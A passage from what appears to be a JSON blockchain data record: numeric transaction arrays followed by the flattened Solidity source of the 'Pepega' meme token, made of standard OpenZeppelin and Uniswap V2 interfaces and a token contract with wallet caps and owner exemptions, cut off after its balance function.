      147054,
      194612671562,
      0,
      1,
      2882009,
      47054,
      5881789
    ],
    [
      17195480,
      1683302375,
      2,
      30,
      0,
      147054,
      194612671562,
      0,
      1,
      2929063,
      47054,
      5881789
    ],
    [
      17195480,
      1683302375,
      1,
      31,
      0,
      147054,
      194612671562,
      0,
      1,
      2976117,
      47054,
      5881789
    ],
    [
      17195480,
      1683302375,
      342,
      32,
      0,
      56652,
      194612671562,
      0,
      1,
      3023327,
      47210,
      5881789
    ],
    [
      17195480,
      1683302375,
      1124,
      42,
      0,
      56652,
      191612671562,
      0,
      1,
      3555748,
      47210,
      5881789
    ],
    [
      17195481,
      1683302387,
      47,
      18,
      0,
      56652,
      189673853578,
      0,
      1,
      3665117,
      47210,
      5881788
    ],
    [
      17195481,
      1683302387,
      1,
      19,
      0,
      56652,
      189673853578,
      0,
      1,
      3712327,
      47210,
      5881788
    ],
    [
      17195482,
      1683302399,
      20737,
      26,
      0,
      100000,
      195494423335,
      0,
      1,
      3153731,
      47210,
      5881787
    ],
    [
      17195482,
      1683302399,
      1970,
      27,
      0,
      100000,
      195494423335,
      0,
      1,
      3200941,
      47210,
      5881787
    ],
    [
      17195482,
      1683302399,
      1470,
      28,
      0,
      100000,
      195494423335,
      0,
      1,
      3248151,
      47210,
      5881787
    ],
    [
      17195482,
      1683302399,
      8049,
      29,
      0,
      100000,
      195494423335,
      0,
      1,
      3295361,
      47210,
      5881787
    ],
    [
      17195482,
      1683302399,
      771,
      36,
      0,
      56652,
      193494423335,
      0,
      1,
      3567315,
      47210,
      5881787
    ],
    [
      17195484,
      1683302423,
      9,
      56,
      0,
      56652,
      197789856962,
      0,
      1,
      4074515,
      47210,
      5881785
    ],
    [
      17195484,
      1683302423,
      282,
      57,
      0,
      56652,
      197789856962,
      0,
      1,
      4121725,
      47210,
      5881785
    ],
    [
      17195484,
      1683302423,
      1081,
      59,
      0,
      56652,
      197789856962,
      0,
      1,
      4212333,
      47210,
      5881785
    ],
    [
      17195485,
      1683302435,
      7116,
      28,
      0,
      56652,
      201084474165,
      0,
      1,
      2088531,
      47210,
      5881784
    ],
    [
      17195485,
      1683302435,
      367,
      29,
      0,
      56652,
      201084474165,
      0,
      1,
      2135741,
      47210,
      5881784
    ],
    [
      17195486,
      1683302447,
      424,
      21,
      0,
      56652,
      196878752864,
      0,
      1,
      2170469,
      47210,
      5881783
    ],
    [
      17195486,
      1683302447,
      54,
      22,
      0,
      56652,
      196878752864,
      0,
      1,
      2217679,
      47210,
      5881783
    ],
    [
      17195486,
      1683302447,
      247,
      23,
      0,
      56652,
      196878752864,
      0,
      1,
      2264889,
      47210,
      5881783
    ],
    [
      17195489,
      1683302483,
      722,
      28,
      0,
      56652,
      194947866073,
      0,
      1,
      2293572,
      47210,
      5881780
    ],
    [
      17195489,
      1683302483,
      6901,
      32,
      0,
      56652,
      192947866073,
      0,
      1,
      2589437,
      47210,
      5881780
    ],
    [
      17195489,
      1683302483,
      367,
      33,
      0,
      56652,
      192947866073,
      0,
      1,
      2636647,
      47210,
      5881780
    ],
    [
      17195489,
      1683302483,
      392,
      39,
      0,
      56652,
      194947866073,
      0,
      1,
      3144236,
      47210,
      5881780
    ],
    [
      17195489,
      1683302483,
      145,
      87,
      0,
      56652,
      191447866073,
      0,
      1,
      6518864,
      47210,
      5881780
    ],
    [
      17195490,
      1683302507,
      7,
      58,
      0,
      56652,
      191625331895,
      0,
      1,
      3557472,
      47210,
      5881779
    ],
    [
      17195490,
      1683302507,
      35,
      59,
      0,
      56652,
      191625331895,
      0,
      1,
      3604682,
      47210,
      5881779
    ],
    [
      17195492,
      1683302531,
      1620,
      44,
      0,
      56652,
      203733848302,
      0,
      1,
      3489141,
      47210,
      5881777
    ],
    [
      17195492,
      1683302531,
      4921,
      45,
      0,
      56652,
      203733848302,
      0,
      1,
      3536351,
      47210,
      5881777
    ],
    [
      17195492,
      1683302531,
      993,
      46,
      0,
      56652,
      203733848302,
      0,
      1,
      3583561,
      47210,
      5881777
    ],
    [
      17195492,
      1683302531,
      1072,
      47,
      0,
      56652,
      203733848302,
      0,
      1,
      3630771,
      47210,
      5881777
    ],
    [
      17195493,
      1683302543,
      339,
      8,
      0,
      146838,
      303000000000,
      0,
      1,
      1023139,
      47210,
      5881776
    ],
    [
      17195493,
      1683302543,
      5787,
      17,
      0,
      56652,
      214382660316,
      0,
      1,
      1919237,
      47210,
      5881776
    ],
    [
      17195493,
      1683302543,
      6,
      117,
      0,
      42592,
      196840685490,
      0,
      1,
      7444810,
      23595,
      5881776
    ],
    [
      17195493,
      1683302543,
      35,
      154,
      0,
      46886,
      196640685490,
      0,
      1,
      12895723,
      46886,
      5881776
    ],
    [
      17195494,
      1683302555,
      440,
      10,
      0,
      56652,
      197065950001,
      0,
      1,
      1179286,
      47210,
      5881775
    ],
    [
      17195495,
      1683302567,
      750,
      78,
      0,
      56652,
      192850910342,
      0,
      1,
      10929358,
      47210,
      5881774
    ],
    [
      17195496,
      1683302579,
      166,
      54,
      0,
      56652,
      197868331334,
      0,
      1,
      8297900,
      47210,
      5881773
    ],
    [
      17195496,
      1683302579,
      13,
      74,
      0,
      47150,
      196868331334,
      0,
      1,
      10271333,
      47150,
      5881773
    ],
    [
      17195497,
      1683302591,
      176,
      62,
      0,
      56652,
      215000000000,
      0,
      1,
      8385098,
      46946,
      5881772
    ],
    [
      17195499,
      1683302615,
      3749,
      54,
      0,
      47150,
      238221066193,
      0,
      1,
      5833850,
      47150,
      5881770
    ],
    [
      17195500,
      1683302627,
      383,
      13,
      0,
      47006,
      318997516416,
      0,
      1,
      3358250,
      47006,
      5881769
    ],
    [
      17195500,
      1683302627,
      7,
      83,
      0,
      72295,
      249279498077,
      0,
      1,
      8014798,
      48197,
      5881769
    ],
    [
      17195502,
      1683302651,
      883,
      24,
      0,
      56652,
      262418218130,
      0,
      1,
      2259233,
      47210,
      5881767
    ],
    [
      17195502,
      1683302651,
      33,
      30,
      0,
      56652,
      262418218130,
      0,
      1,
      2567238,
      47210,
      5881767
    ],
    [
      17195505,
      1683302687,
      17,
      17,
      0,
      127154,
      258401510577,
      0,
      1,
      2643500,
      27154,
      5881764
    ],
    [
      17195510,
      1683302747,
      637,
      133,
      0,
      56652,
      240412258358,
      0,
      1,
      11240450,
      46946,
      5881759
    ],
    [
      17195512,
      1683302771,
      8,
      339,
      0,
      47150,
      229924941960,
      0,
      1,
      16426367,
      46886,
      5881757
    ],
    [
      17195513,
      1683302783,
      385,
      113,
      0,
      67744,
      237783375518,
      0,
      1,
      8495828,
      40363,
      5881756
    ],
    [
      17195515,
      1683302807,
      12,
      14,
      0,
      94300,
      258135600392,
      0,
      1,
      2028551,
      47150,
      5881754
    ],
    [
      17195516,
      1683302819,
      50,
      146,
      0,
      46946,
      224601604344,
      0,
      1,
      7773107,
      46946,
      5881753
    ],
    [
      17195518,
      1683302843,
      298,
      34,
      0,
      56652,
      228382357790,
      0,
      1,
      1379592,
      47210,
      5881751
    ],
    [
      17195524,
      1683302915,
      18,
      63,
      0,
      46862,
      213956292013,
      0,
      1,
      8604903,
      46862,
      5881745
    ],
    [
      17195532,
      1683303011,
      10,
      184,
      0,
      47150,
      238550704720,
      0,
      1,
      11738791,
      47150,
      5881737
    ],
    [
      17195540,
      1683303107,
      248,
      10,
      0,
      46874,
      300000000000,
      0,
      1,
      1609060,
      46874,
      5881729
    ],
    [
      17195540,
      1683303107,
      450,
      98,
      0,
      47150,
      215932155480,
      0,
      1,
      7843203,
      47150,
      5881729
    ],
    [
      17195545,
      1683303167,
      11,
      177,
      0,
      47150,
      217859111082,
      0,
      1,
      15627067,
      47150,
      5881724
    ],
    [
      17195552,
      1683303251,
      9,
      37,
      0,
      56652,
      218201173754,
      0,
      1,
      4791115,
      47210,
      5881717
    ],
    [
      17195554,
      1683303275,
      100,
      32,
      0,
      47150,
      213597139459,
      0,
      1,
      3289000,
      47150,
      5881715
    ],
    [
      17195558,
      1683303323,
      13,
      34,
      0,
      94420,
      236000000000,
      0,
      1,
      3274979,
      47210,
      5881711
    ],
    [
      17195558,
      1683303323,
      122,
      94,
      0,
      47150,
      214967588394,
      0,
      1,
      8078382,
      47150,
      5881711
    ],
    [
      17195564,
      1683303395,
      4,
      107,
      0,
      47150,
      204827740009,
      0,
      1,
      14402619,
      47150,
      5881705
    ],
    [
      17195566,
      1683303419,
      11,
      59,
      0,
      47150,
      211417479323,
      0,
      1,
      4992438,
      47150,
      5881703
    ],
    [
      17195593,
      1683303743,
      2080,
      30,
      0,
      47150,
      208475864711,
      0,
      1,
      4694711,
      47150,
      5881676
    ],
    [
      17195607,
      1683303923,
      772,
      311,
      0,
      46874,
      207368648238,
      0,
      1,
      19099933,
      46874,
      5881662
    ],
    [
      17195613,
      1683303995,
      2081,
      25,
      0,
      47210,
      211559433309,
      0,
      1,
      3211197,
      47210,
      5881656
    ],
    [
      17195624,
      1683304127,
      36,
      169,
      0,
      67744,
      201608937511,
      0,
      1,
      14734156,
      40363,
      5881645
    ],
    [
      17195652,
      1683304463,
      223,
      142,
      0,
      47150,
      199705258843,
      0,
      1,
      8472497,
      47150,
      5881617
    ],
    [
      17195729,
      1683305399,
      638,
      123,
      0,
      47150,
      228366686321,
      0,
      1,
      8076659,
      46886,
      5881540
    ],
    [
      17195756,
      1683305723,
      123,
      19,
      0,
      70815,
      239573459193,
      0,
      1,
      1097791,
      47210,
      5881513
    ],
    [
      17195910,
      1683307607,
      16,
      103,
      0,
      47150,
      228236696297,
      0,
      1,
      7246365,
      47150,
      5881359
    ],
    [
      17196184,
      1683310919,
      38,
      122,
      0,
      46946,
      215000000000,
      0,
      1,
      8316535,
      46946,
      5881085
    ],
    [
      17196448,
      1683314135,
      2,
      154,
      0,
      47150,
      162341118734,
      0,
      1,
      14563625,
      47150,
      5880821
    ],
    [
      17196746,
      1683317735,
      6,
      34,
      0,
      47150,
      150535825839,
      0,
      1,
      3769681,
      47150,
      5880523
    ],
    [
      17197194,
      1683323159,
      9,
      87,
      0,
      93718,
      154293380957,
      0,
      1,
      8085393,
      57679,
      5880075
    ],
    [
      17197531,
      1683327239,
      1,
      180,
      0,
      47150,
      142028985567,
      0,
      1,
      13274377,
      47150,
      5879738
    ],
    [
      17197921,
      1683331967,
      639,
      78,
      0,
      70815,
      139282718328,
      0,
      1,
      6425325,
      46946,
      5879348
    ],
    [
      17197937,
      1683332171,
      17,
      161,
      0,
      70815,
      127525739032,
      0,
      1,
      12596539,
      47210,
      5879332
    ],
    [
      17197957,
      1683332411,
      18,
      107,
      0,
      47150,
      125991593549,
      0,
      1,
      8343086,
      47150,
      5879312
    ],
    [
      17198958,
      1683344627,
      11,
      68,
      0,
      44499,
      110758293404,
      0,
      1,
      6788814,
      24866,
      5878311
    ],
    [
      17202962,
      1683393155,
      8,
      40,
      0,
      72604,
      164270012335,
      0,
      1,
      4993937,
      48317,
      5874307
    ],
    [
      17202965,
      1683393191,
      9,
      146,
      0,
      46886,
      157910581501,
      0,
      1,
      13903577,
      46886,
      5874304
    ],
    [
      17214625,
      1683534935,
      23,
      60,
      0,
      44499,
      108588089861,
      0,
      1,
      6706316,
      24866,
      5862644
    ],
    [
      19422978,
      1710294527,
      5703,
      70,
      0,
      67905,
      46984204396,
      0,
      1,
      3865306,
      40363,
      3654291
    ]
  ],
  "sourcecode": "// SPDX-License-Identifier: UNLICENSED\n\n/**\nPepega is 100% community owned. We strive to be the fastest \ngrowing and hardest working community in the meme universe.   \n\nWebsite: https://pepega.pro\nTelegram: https://t.me/pepega_eth\nTwitter: https://twitter.com/pepega_eth\n */\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\n// File: @openzeppelin/contracts/access/Ownable.sol\n\n\n// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)\n\npragma solidity ^0.8.0;\n\n\n/**\n * @dev Contract module which provides a basic access control mechanism, where\n * there is an account (an owner) that can be granted exclusive access to\n * specific functions.\n *\n * By default, the owner account will be the one that deploys the contract. This\n * can later be changed with {transferOwnership}.\n *\n * This module is used through inheritance. It will make available the modifier\n * `onlyOwner`, which can be applied to your functions to restrict their use to\n * the owner.\n */\nabstract contract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor() {\n        _transferOwnership(_msgSender());\n    }\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() {\n        _checkOwner();\n        _;\n    }\n\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner() internal view virtual {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n    }\n\n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby removing any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner {\n        _transferOwnership(address(0));\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        _transferOwnership(newOwner);\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership(address newOwner) internal virtual {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n}\n\n// File: @uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol\n\npragma solidity >=0.5.0;\n\ninterface IUniswapV2Factory {\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n    function feeTo() external view returns (address);\n    function feeToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n    function allPairs(uint) external view returns (address pair);\n    function allPairsLength() external view returns (uint);\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n\n    function setFeeTo(address) external;\n    function setFeeToSetter(address) external;\n}\n\n// File: @uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol\n\npragma solidity >=0.6.2;\n\ninterface IUniswapV2Router01 {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB, uint liquidity);\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETH(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountToken, uint amountETH);\n    function removeLiquidityWithPermit(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETHWithPermit(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountToken, uint amountETH);\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapTokensForExactTokens(\n        uint amountOut,\n        uint amountInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\n}\n\n// File: @uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol\n\npragma solidity >=0.6.2;\n\n\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountETH);\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountETH);\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external payable;\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n\n// File: @openzeppelin/contracts/utils/math/SafeMath.sol\n\n\n// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)\n\npragma solidity ^0.8.0;\n\n// CAUTION\n// This version of SafeMath should only be used with Solidity 0.8 or later,\n// because it relies on the compiler's built in overflow checks.\n\n/**\n * @dev Wrappers over Solidity's arithmetic operations.\n *\n * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler\n * now has built in overflow checking.\n */\nlibrary SafeMath {\n    /**\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            uint256 c = a + b;\n            if (c < a) return (false, 0);\n            return (true, c);\n        }\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            if (b > a) return (false, 0);\n            return (true, a - b);\n        }\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n            // benefit is lost if 'b' is also tested.\n            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n            if (a == 0) return (true, 0);\n            uint256 c = a * b;\n            if (c / a != b) return (false, 0);\n            return (true, c);\n        }\n    }\n\n    /**\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            if (b == 0) return (false, 0);\n            return (true, a / b);\n        }\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            if (b == 0) return (false, 0);\n            return (true, a % b);\n        }\n    }\n\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     *\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a + b;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a - b;\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `*` operator.\n     *\n     * Requirements:\n     *\n     * - Multiplication cannot overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a * b;\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers, reverting on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator.\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a / b;\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * reverting when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a % b;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {trySub}.\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b <= a, errorMessage);\n            return a - b;\n        }\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b > 0, errorMessage);\n            return a / b;\n        }\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * reverting with custom message when dividing by zero.\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {tryMod}.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b > 0, errorMessage);\n            return a % b;\n        }\n    }\n}\n\n// File: @openzeppelin/contracts/token/ERC20/IERC20.sol\n\n\n// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address to, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n}\n\n// File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\n\n\n// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)\n\npragma solidity ^0.8.0;\n\n\n/**\n * @dev Interface for the optional metadata functions from the ERC20 standard.\n *\n * _Available since v4.1._\n */\ninterface IERC20Metadata is IERC20 {\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() external view returns (string memory);\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol() external view returns (string memory);\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals() external view returns (uint8);\n}\n\n// File: token-7.sol_flattened.sol\n\n\npragma solidity ^0.8.17;\n\n\ncontract pepega is IERC20, IERC20Metadata, Ownable {\n    using SafeMath for uint256;\n    string  private constant _name = \"Pepega\";\n    string  private constant _symbol = \"PEPG\";\n    uint8   private constant _decimals = 18;\n    uint256 private _maxWalletBalancePercentage = 300; // 3%\n    uint256 private _maxTxAmountPercentage = 300; // 3%\n    uint256 private _minTokensBeforeSwapPercentage = 5; // 0.05%\n    mapping(address => uint256) private _balances;\n    mapping(address => mapping(address => uint256)) private _allowances;\n    uint256 private _totalSupply;\n    address private _uniswapV2Pair;\n    IUniswapV2Router02 private _uniswapV2Router;\n    address private constant _uniswapRouterAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n    uint256 private constant _divisor = 10000; // 100%\n    bool    private swapping = false;\n    bool    private _cooldownEnabled = true;\n    mapping(address => uint256) private _lastTxBlock;\n    mapping(address => bool) private _isExcludedFromCooldown;\n    mapping(address => bool) private _isExcludedFromMaxTx;\n    uint256 private _sellFee = 0; // 0%\n    uint256 private _burnFee = 0; // 0%\n    uint256 private _buyFee = 0; // 0%\n    mapping(address => bool) private _isExcludedFromFees;\n\n    address private _marketingWallet;\n\n    address private constant _burnAddress = address(0);\n\n    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiqudity);\n    event Received();\n\n    constructor () {\n        uint256 total = 100_000_000 * 10 ** _decimals;\n        _mint(_msgSender(), total);\n        _marketingWallet = _msgSender();\n        _uniswapV2Router = IUniswapV2Router02(_uniswapRouterAddress);\n        _approve(address(this), address(_uniswapV2Router), total);\n        _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())\n        .createPair(address(this), _uniswapV2Router.WETH());\n        IERC20(_uniswapV2Pair).approve(address(_uniswapV2Router), type(uint).max);\n        _isExcludedFromCooldown[address(this)] = true;\n        _isExcludedFromCooldown[owner()] = true;\n        _isExcludedFromFees[address(this)] = true;\n        _isExcludedFromFees[owner()] = true;\n        _isExcludedFromFees[_marketingWallet] = true;\n        _isExcludedFromMaxTx[owner()] = true;\n        _isExcludedFromMaxTx[address(this)] = true;\n        _isExcludedFromMaxTx[_marketingWallet] = true;\n        _isExcludedFromMaxTx[_uniswapV2Pair] = true;\n    }\n\n    // Functions\n    function name() public pure returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public pure returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public pure returns (uint8) {\n        return _decimals;\n    }\n\n    function totalSupply() public view override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n    